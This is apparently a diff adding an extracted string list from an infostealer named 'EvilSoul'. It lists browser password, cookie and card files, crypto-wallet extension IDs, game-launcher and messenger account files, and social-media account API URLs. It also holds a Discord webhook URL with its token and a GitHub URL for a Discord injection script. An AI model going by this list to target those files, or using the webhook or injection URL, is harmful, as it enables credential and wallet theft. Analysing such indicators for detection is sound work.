@@ -1,0 +1,226 @@
+%WEBHOOK%
+-# 🔗 Click [here](https://open.spotify.com/user/
+-# 🔗 Click [here](https://tiktok.com/@
+-# 🔗 Click [here](https://www.instagram.com/
+-#
+/api/account-settings/v1/profile
+@primno/dpapi
+Badlion
+C:\\Program Files (x86)\\Steam
+CheatBreakers
+EvilSoul
+Feather
+GET
+HideConsole
+Impact
+Intent
+Lunar
+Meteor
+Microsoft Store
+Minecraft
+NODE_TLS_REJECT_UNAUTHORIZED
+Novoline
+Paladium
+PolyMC
+Rise
+Rise (Intent)
+SKLauncher
+Spotify Session
+TLauncher
+TikTok Session
+Web Data
+\================\nGUID: 
+\================\nNAME: 
+\================\nURL: 
+\================\nUSERNAME: 
+\Accounts
+\Armory Agent
+\Atomic
+\Battle.net
+\Binance
+\Bitcoin
+\Bytecoin
+\Default
+\Discord
+\Epic Games Launcher
+\Ethereum
+\Exodus
+\FileZilla
+\GoogleDrive
+\Guitar Pro
+\Intent
+\Local Extension Settings\aeachknmefphepccionboohckonoeemg
+\Local Extension Settings\aholpfdialjgjfhomihkjbmgjidlcdno
+\Local Extension Settings\aiifbnbfobpmeekipheeijimdpnlpgpp
+\Local Extension Settings\akoiaibnepcedcplijmiamnaigbepmcb
+\Local Extension Settings\amkmjjmmflddogmhpjloimipbofnfjih
+\Local Extension Settings\aodkkagnadcbobfpggfnjeongemjbjca
+\Local Extension Settings\bfnaelmomeimhlpmgjnjophhpkkoljpa
+\Local Extension Settings\blnieiiffboillknjnepogjhkgnoapac
+\Local Extension Settings\cgeeodpfagjceefieflmdfphplkenlfk
+\Local Extension Settings\cjelfplplebdjjenllpjcblmjkfcffne
+\Local Extension Settings\cplklnmnlbnpmjogncfgfijoopmnlemp
+\Local Extension Settings\dlcobpjiigpikoobohmabehhmhfoodbb
+\Local Extension Settings\dmkamcknogkgcdfhhbddcghachkejeap
+\Local Extension Settings\dngmlblcodfobpdpecaadgfbcggfjfnm
+\Local Extension Settings\ebfidpplhabeedpnhjnobghokpiioolj
+\Local Extension Settings\efbglgofoippbgcjepnhiblaibcnclgk
+\Local Extension Settings\egjidjbpglichdcondbcbdnbeeppgdph
+\Local Extension Settings\ejbalbakoplchlghecdalmeeeajnimhm
+\Local Extension Settings\ejjladinnckdgjemekebdpeokbikhfci
+\Local Extension Settings\epapihdplajcdnnkdeiahlgigofloibg
+\Local Extension Settings\ffnbelfdoeiohenkjibnmadjiehjhajb
+\Local Extension Settings\fhbohimaelbohpjbbldcngcnapndodjp
+\Local Extension Settings\fhilaheimglignddkjgofkcbgekhenbh
+\Local Extension Settings\fhmfendgdocmcbmfikdcogofphimnkno
+\Local Extension Settings\fihkakfobkmkjojpchpfgcmhfjnmnfpi
+\Local Extension Settings\fnjhmkhhmkbjkkabndcnnogagogbneec
+\Local Extension Settings\fnnegphlobjdpkhecapkijjdkgcjhkib
+\Local Extension Settings\hifafgmccdpekplomjjkcfgodnhcellj
+\Local Extension Settings\hmeobnfnfcmdkdcmlblgagmfpfboieaf
+\Local Extension Settings\hnfanknocfeofbddgcijnmhnfnkdnaad
+\Local Extension Settings\hpglfhgfnhbgpjdenjgmdgoeiappafln
+\Local Extension Settings\ibnejdfjmmkpcnlpebklmnkoeoihofec
+\Local Extension Settings\jbdaocneiiinmjbjlgalhcelgbejmnid
+\Local Extension Settings\jnlgamecbpmbajjfhmmmlhejkemejdma
+\Local Extension Settings\khpkpbbcccdmmclmpigdgddabeilkdpd
+\Local Extension Settings\kjmoohlgokccodicjjfebfomlbljgfhk
+\Local Extension Settings\kncchdigobghenbbaddojjnnaogfppfj
+\Local Extension Settings\kpfopkelmapcoipemfendmdcghnegimn
+\Local Extension Settings\lpfcbjknijpeeillifnkikgncikgfhdo
+\Local Extension Settings\mcbigmjiafegjnnogedioegffbooigli
+\Local Extension Settings\mcohilncbfahbmgdjkbpemcciiolgcge
+\Local Extension Settings\mgffkfbidihjpoaomajlbgchddlicgpn
+\Local Extension Settings\nanjmdknhkinifnkgdcggcfnhdaammmj
+\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn
+\Local Extension Settings\nkddgncdjgjfcddamfgcmfnlhccnimig
+\Local Extension Settings\nlbmnnijcnlegkjjpcfjclmcfggfefdm
+\Local Extension Settings\nphplpgoakhhjchkkhmiggakijnkhfnd
+\Local Extension Settings\odbfpeeihdkbihmopkbjmoonfanlbfcl
+\Local Extension Settings\ookjlbkiijinhpmnjffcofjonbfbgaoc
+\Local Extension Settings\opcgpfmipidbgpenhmajoajpbobppdil
+\Local Extension Settings\pdadjkfkgcafgbceimcpbkalnfnepbnk
+\Local Extension Settings\pjkljhegncpnkpknbcohdijeoejaedia
+\Local Extension Settings\pnlfjmlcjdjgkddecgincgnldmadjgac
+\Login Data
+\Local State
+\Local\
+\LocalState
+\Metamask
+\Monero
+\Network\
+\NordVPN
+\OneDrive
+\Opera
+\Origin
+\Passwords
+\Profile 1
+\Profile 2
+\Profile 3
+\Profile 4
+\Profile 5
+\Roaming\
+\Sync Extension Settings\afbcbjpbpfadlkmhmclhkeeodmamcflc
+\Sync Extension Settings\bhjcihagjdlcpimafggjdlhfklnefmdl
+\Sync Extension Settings\bhghoamapcdpbohphigoooaddinpkbai
+\Sync Extension Settings\bkpenclhmiealbeembkmhcknfeimkjnk
+\Sync Extension Settings\ocglkepbibnalbgmbachknglpdipeoio
+\Telegram Desktop
+\Uplay
+\Web Data
+\WebData
+\WinSCP 2
+\Yandex
+\Zcash
+\accounts
+\accounts.json
+\accounts.nbt
+\alts.novo
+\alts.txt
+\app-0.0.5
+\autofills.txt
+\cards.db
+\cheatbreaker_accounts.json
+\chrome
+\config
+\cookies
+\creditcards.txt
+\discord\
+\discordcanary\
+\discorddevelopment\
+\discordptb\
+\extensions
+\history.db
+\history.txt
+\index.js
+\intentlauncher
+\intentlauncher\
+\intentlauncher\launcherconfig
+\intentlauncher\Rise
+\launcher_accounts_microsoft_store.json
+\launcher_profiles.json
+\lightcord\
+\loginusers.vdf
+\paladium-group
+\passwords.db
+\passwords.txt
+\settings\
+\sklauncher\
+\steam
+\tdata
+application/json
+autofills.txt
+cards.db
+cheatbreaker_accounts.json
+chrome
+config
+cookies
+cookies.txt
+creditcards.txt
+evil
+history.db
+history.txt
+https://api.ipify.org
+https://api.roblox.com/auth/token/metadata
+https://api.roblox.com/currency-balance
+https://auth.roblox.com/v1/logout
+https://auth.roblox.com/v1/usernames/validate
+https://canary.discord.com/api/webhooks/1368899664296022057/_6PXLT1eRIrNn9tTy41CjSvzkCXPqQgZATGCf0HLlDhGJNojjZJSlyGhMR9j_OinfnkT
+https://economy.roblox.com/v1/users/
+https://images-ext-1.discordapp.net/external/btaMDqIYGzHMIoM6r-e_xqe0pA8Q-WzVWshCn4TmEZA/https/i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg?format=webp
+https://raw.githubusercontent.com/EvilSoulStealer/EvilSoul/main/injections/discord.js
+https://users.roblox.com/v1/users/authenticated
+https://users.roblox.com/v1/users/authenticated/birthdate
+https://www.instagram.com/api/v1/accounts/current_user/?edit=true
+https://www.instagram.com/api/v1/accounts/edit/
+https://www.instagram.com/api/v1/web/accounts/logout/ajax/
+https://www.instagram.com/api/v1/web/get_ranking/
+https://www.instagram.com/api/v1/web/session/login_activity/get_account_sessions/
+https://www.instagram.com/api/v1/web/settings/set_email/
+https://www.instagram.com/api/v1/web/settings/set_phone_number/
+https://www.myexternalip.com/raw
+https://www.roblox.com/mobileapi/userinfo
+https://www.spotify.com/api/account-settings/v1/profile
+https://www.tiktok.com/api/user/account/info/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true
+https://www.tiktok.com/api/v2/shop/wallet/buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true
+https://www.tiktok.com/api/wallet_api/coin_balance/get?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true
+instagram
+intentlauncher
+intentlauncher\
+intentlauncher\Rise
+intentlauncher\launcherconfig
+launcher_accounts_microsoft_store.json
+launcher_profiles.json
+lightcord\
+loginusers.vdf
+minecraft
+paladium-group
+passwords.db
+passwords.txt
+settings\
+sklauncher\
+soul
+steam
+tdata
+undefined
+webdata.db
